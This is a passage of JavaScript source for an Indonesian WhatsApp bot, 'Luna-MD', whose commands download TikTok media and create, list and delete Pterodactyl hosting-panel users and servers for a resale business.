*💾 Ram : ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
*💾 Disk : ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
*💾 CPU : ${cpu == "0" ? "Unlimited" : cpu+"%"}*
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *Luna-MD*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await fs.writeFileSync("akunpanel.txt", teks)
await luna.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: qloc})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "self": {
if (!isOwner) return m.reply(mess.owner)
luna.public = false
m.reply("Berhasil mengganti mode bot menjadi *Self*")
}
break      

case "ttmp3": case "tiktokmp3": {
    try {
        if (!text) return m.reply(`*Contoh: ${usedPrefix + command} https://vt.tiktok.com/...*`);

        await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        let res = await fetch('https://ttsave.app/download', {
            method: 'POST',
            headers: {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            body: JSON.stringify({
                query: text,
                language_id: '2'
            })
        });

        let html = await res.text();

        let regex = /href="(https:\/\/v16-ies-music\.tiktokcdn\.com\/[^"]+)"/g;
        let audioUrl;
        let match;

        while ((match = regex.exec(html)) !== null) {
            if (match[1].includes('mime_type=audio')) {
                audioUrl = match[1];
                break;
            }
        }

        if (!audioUrl) {
            return m.reply('🍂 *Audio TikTok tidak ditemukan*');
        }

        await luna.sendMessage(
            m.chat,
            {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg'
            },
            { quoted: m }
        );

    } catch (e) {
        await m.reply(`🍂 *Terjadi kesalahan*\n${e.message}`);
    } finally {
        await luna.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
};
break

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await luna.sendMessage(m.chat, {react: {text: '📥', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: luna.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*video tiktok berhasil ke download ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await luna.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await luna.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*video tiktok berhasil ke download ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await luna.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await luna.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'luna-md.jpg');

let teks = directLink.toString()
await luna.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

case "cadmin": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*DATA AKUN PANEL ADMIN ANDA 🚚*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

───────────────────────────────
*📡 ID USER (${user.id})* 
*?? USERNAME :* ${user.username}
*🔐 PASSWORD :* ${password.toString()}
* 🌐 LINK :* ${global.domain}
───────────────────────────────

───────────────────────────────
*RULES & ADP*
• Jangan Open Admin Panel Lagi
• Jangan Open Reseller 
> Jika di Langgar akan di und

*SYARAT & KETENTUAN :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
───────────────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await fs.writeFileSync("./akunpanel.txt", teks)
await luna.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

case "cadmin-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*DATA AKUN PANEL ADMIN ANDA 🚚*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

───────────────────────────────
*📡 ID USER (${user.id})* 
*👤 USERNAME :* ${user.username}
*🔐 PASSWORD :* ${password.toString()}
*🌐 LINK :* ${global.domainV2}
───────────────────────────────

───────────────────────────────
*RULES & ADP*
• Jangan Open Admin Panel Lagi
• Jangan Open Reseller 
> Jika di Langgar akan di und

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
───────────────────────────────
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await fs.writeFileSync("./akunpanel.txt", teks)
await luna.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

case "addseller": {
if (!isOwner) return reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
luna.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

case "delseller": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*?? Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await luna.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "listadmin-v2": {
if (!isOwner) return reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await luna.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "listpanel-v2": {
if (!isOwner) return reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await luna.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "deladmin-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return luna.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "delpanel-v2": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return luna.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "listadmin": {
if (!isOwner && !isPremium) return reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await luna.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "listpanel": case "listp": case "listserver": {
if (!isOwner && !isPremium) return reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await luna.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "deladmin": {
if (!isOwner) return reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return luna.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "delpanel": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return luna.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "pay":
case "payment": {
const teks =
`
Berikut adalah list metode pembayaran yang ada

- Dana
- Gopay
- Ovo
- Shoopepay
- Qris All pay

*Note: Wajib membawa bukti screenshot jika sudah melakukan transaksi*
`
luna.sendMessage(m.chat, {
  buttonsMessage: {
    locationMessage: {
